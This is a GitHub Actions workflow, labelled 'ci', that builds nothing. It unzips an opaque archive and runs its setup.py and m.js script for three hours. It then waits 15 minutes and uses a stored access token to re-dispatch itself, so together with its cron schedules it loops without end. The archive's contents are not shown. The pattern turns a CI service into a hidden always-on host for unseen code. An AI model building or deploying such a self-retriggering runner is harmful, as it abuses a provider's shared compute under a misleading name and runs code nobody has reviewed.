name: ci

on:
  schedule:
    - cron: '17 */4 * * *'
    - cron: '43 2-22/6 * * *'
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 240   # 4 tiếng (đủ cho 3h chạy + 15p wait + 15p buffer)

    steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 1

    - uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    - uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: Extract
      run: |
        [ ! -f n.zip ] && exit 1
        unzip -o -q n.zip

    - name: Init
      run: |
        cd n
        [ -f setup.py ] && python setup.py

    # Chạy chính xác 3 tiếng (10800 giây)
    - name: Run 3 hours
      continue-on-error: true
      run: |
        cd n
        timeout 10800 node m.js || true

    # Dừng 15 phút (900 giây)
    - name: Wait 15 minutes
      if: always()
      run: sleep 900

    # Trigger job mới
    - name: Dispatch
      if: always()
      env:
        GH_PAT: ${{ secrets.GH_PAT }}
      run: |
        curl -s -X POST \
          -H "Authorization: token $GH_PAT" \
          -H "Accept: application/vnd.github+json" \
          https://api.github.com/repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches \
          -d "{\"ref\":\"${{ github.ref_name }}\"}" > /dev/null
